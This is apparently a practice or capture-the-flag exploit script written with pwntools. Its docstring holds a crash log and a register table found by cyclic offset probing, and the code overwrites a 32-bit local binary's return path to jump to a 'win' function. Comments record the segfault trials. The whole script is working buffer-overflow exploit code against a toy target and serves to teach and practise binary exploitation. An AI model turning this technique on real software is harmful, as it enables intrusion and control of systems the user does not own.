"""
trying i=99
[+] Starting local process './example': pid 101
[*] Process './example' stopped with exit code -11 (SIGSEGV) (pid 101)
[+] Parsing corefile...: Done
[*] '/tmp/core.example.101'
    Arch:      i386-32-little
    EIP:       0x56556243
    ESP:       0x61616170
    Exe:       '/app/example' (0x56555000)
    Fault:     0x61616170
+----------+------------+---------------+-------------+
| register | hex value  | decimal value | cyclic_find |
+----------+------------+---------------+-------------+
| orig_eax | 0xffffffff | 4294967295    | -1          |
| edi      | 0xf7ffcb80 | 4160736128    | -1          |
| ebp      | 0x61616177 | 1633771895    | 88          |
| esi      | 0x61616176 | 1633771894    | 84          |
| ebx      | 0x61616175 | 1633771893    | 80          |
| ecx      | 0x61616174 | 1633771892    | 76          |
| esp      | 0x61616170 | 1633771888    | 60          |
| eip      | 0x56556243 | 1448436291    | -1          |
| eflags   | 0x10282    | 66178         | -1          |
| xgs      | 0x63       | 99            | -1          |
| xds      | 0x2b       | 43            | -1          |
| xes      | 0x2b       | 43            | -1          |
| xss      | 0x2b       | 43            | -1          |
| xcs      | 0x23       | 35            | -1          |
| edx      | 0x1        | 1             | -1          |
| eax      | 0x0        | 0             | -1          |
| xfs      | 0x0        | 0             | -1          |
+----------+------------+---------------+-------------+
...
"""

import sys
from pwn import *
from itertools import cycle


shellcode = {
    int(sys.argv[1]): b"\xad\x61\x55\x56", # $1 = {<text variable, no debug info>} 0x565561ad <win>
    int(sys.argv[2]): b"\xad\x61\x55\x56", # $1 = {<text variable, no debug info>} 0x565561ad <win>
    #  87: 0x565561adb, # $1 = {<text variable, no debug info>} 0x565561ad <win>
    #  59: 0x565561adb, # $1 = {<text variable, no debug info>} 0x565561ad <win>
}

payload = flat(shellcode, filler=cycle(b'A'))

sys.stdout.buffer.write(payload)


# ./example "$(python3 -c "print('A' * 77)")" 
# -> segfault at 0 ip 0000000000000000 
# ./example "$(python3 -c "print('A' * 78)")" 
# -> segfault at ff00413d ip 0000000056556243
# ./example "$(python3 -c "print('A' * 78)")" 
# -> segfault at 41413d

